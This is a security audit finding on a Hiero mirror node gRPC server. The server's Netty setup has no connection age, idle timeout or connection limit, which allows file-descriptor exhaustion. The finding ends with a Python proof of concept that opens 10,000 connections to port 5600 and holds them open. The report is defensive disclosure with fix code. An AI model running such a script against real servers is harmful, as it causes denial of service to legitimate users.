### Title
Unbounded gRPC Connection Acceptance Enables File Descriptor Exhaustion DoS

### Summary
`grpcServerConfigurer()` configures `maxConcurrentCallsPerConnection` (limiting RPC calls per connection) but sets no limit on the total number of accepted TCP connections, no `maxConnectionAge`, and no `maxConnectionIdle`. An unprivileged attacker can open thousands of idle TCP connections, each consuming one OS file descriptor, and by holding them open (or via a network partition preventing TCP teardown) exhaust the server's FD limit, preventing any new legitimate connections from being accepted.

### Finding Description
In `grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, the `grpcServerConfigurer()` bean (lines 28–35) applies exactly two Netty settings:

```java
serverBuilder.executor(applicationTaskExecutor);
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```

`NettyProperties` exposes only `maxConcurrentCallsPerConnection = 5` (line 14 of `NettyProperties.java`). No call is ever made to:
- `NettyServerBuilder.maxConnectionAge(...)` — no maximum lifetime per connection
- `NettyServerBuilder.maxConnectionIdle(...)` — no idle-connection reaping
- `NettyServerBuilder.maxConnections(...)` / any equivalent total-connection cap
- `NettyServerBuilder.permitKeepAliveWithoutCalls(false)` — no keepalive abuse guard

A grep across all `grpc/**/*.java` and all `**/*.yml` files confirms none of these settings appear anywhere in the project.

**Exploit flow:**
1. Attacker opens N TCP connections to port 5600 (the public gRPC port, no authentication required for connection establishment).
2. Each accepted TCP connection allocates one OS file descriptor on the server side. Netty's `NioServerSocketChannel` accepts the connection before any gRPC handshake is evaluated.
3. Attacker sends a valid HTTP/2 preface on each connection (enough to keep the connection alive at the gRPC layer) but issues no RPC calls, so `maxConcurrentCallsPerConnection=5` is never triggered.
4. Attacker either holds connections open passively, or induces a network partition (e.g., firewall rule drop, BGP manipulation, or simply never sending FIN/RST). Without `maxConnectionIdle` or `maxConnectionAge`, the server never proactively closes these connections. Default Linux TCP keepalive fires after ~2 hours, far too slow to help.
5. Once the JVM process's open-file-descriptor count reaches the OS limit (commonly 65536 for a container, or as low as 1024 in default configs), `accept()` on the server socket fails with `EMFILE`/`ENFILE`. All subsequent legitimate client connections are refused at the OS level.

**Why the existing check is insufficient:**
`maxConcurrentCallsPerConnection=5` only bounds the number of in-flight RPC streams per connection. It does nothing to bound the number of connections themselves. An attacker with N connections and 0 active calls per connection bypasses this guard entirely.

The Grafana alert `GrpcHighFileDescriptors` (threshold: >80% FD usage, window: 5 minutes) is reactive monitoring, not a preventive control. By the time it fires, the server is already near-exhausted and the alert itself cannot close the attacker's connections.

### Impact Explanation
Complete denial of service for all legitimate gRPC clients. The server becomes unable to accept any new TCP connection once FDs are exhausted. Existing long-lived subscriber connections (topic message streaming) may also be disrupted if Netty's I/O threads themselves need FDs for internal operations. Because the gRPC mirror node is the sole interface for consensus topic subscriptions, this partitions all downstream consumers from the Hedera network data stream. Severity: **High** (availability impact, no authentication bypass required, no data exfiltration, but full service outage).

### Likelihood Explanation
Preconditions are minimal: network reachability to port 5600 and the ability to open TCP sockets (any unprivileged user, any OS). No credentials, no protocol knowledge beyond a valid HTTP/2 preface, and no special tooling — `hping3`, `ncat`, or a trivial Python script suffices. The attack is repeatable and automatable. The only practical barrier is upstream network-level rate limiting or connection throttling (e.g., a load balancer or cloud firewall), which is not enforced in the application code and is not documented as a required deployment prerequisite.

### Recommendation
Add the following settings inside `grpcServerConfigurer()` in `GrpcConfiguration.java`, backed by configurable `NettyProperties` fields:

```java
serverBuilder.maxConnectionAge(nettyProperties.getMaxConnectionAge(), TimeUnit.MILLISECONDS);
serverBuilder.maxConnectionAgeGrace(nettyProperties.getMaxConnectionAgeGrace(), TimeUnit.MILLISECONDS);
serverBuilder.maxConnectionIdle(nettyProperties.getMaxConnectionIdle(), TimeUnit.MILLISECONDS);
serverBuilder.permitKeepAliveWithoutCalls(false);
serverBuilder.permitKeepAliveTime(nettyProperties.getMinKeepAliveTime(), TimeUnit.MILLISECONDS);
```

Suggested defaults: `maxConnectionAge=300s`, `maxConnectionIdle=60s`, `maxConnectionAgeGrace=10s`. Additionally, consider adding a total-connection cap via a Netty `ChannelHandler` or an upstream load balancer connection limit, and document the required infrastructure-level controls (e.g., per-IP connection rate limiting at the ingress/LB layer).

### Proof of Concept
```python
import socket, time, threading

TARGET_HOST = "<grpc-mirror-node-host>"
TARGET_PORT = 5600
# HTTP/2 client preface (keeps connection alive at gRPC layer)
HTTP2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

sockets = []

def open_conn():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_HOST, TARGET_PORT))
    s.send(HTTP2_PREFACE)
    sockets.append(s)

threads = [threading.Thread(target=open_conn) for _ in range(10000)]
for t in threads:
    t.start()
for t in threads:
    t.join()

print(f"Opened {len(sockets)} connections. Server FDs exhausted if limit ~65536.")
# Hold connections open indefinitely (simulates network partition / idle hold)
time.sleep(86400)
```

Run this from one or more hosts. Monitor server FD usage via `process_files_open_files` metric. Once FD usage approaches the process limit, new legitimate gRPC connections will be refused with connection errors. [1](#0-0) [2](#0-1)
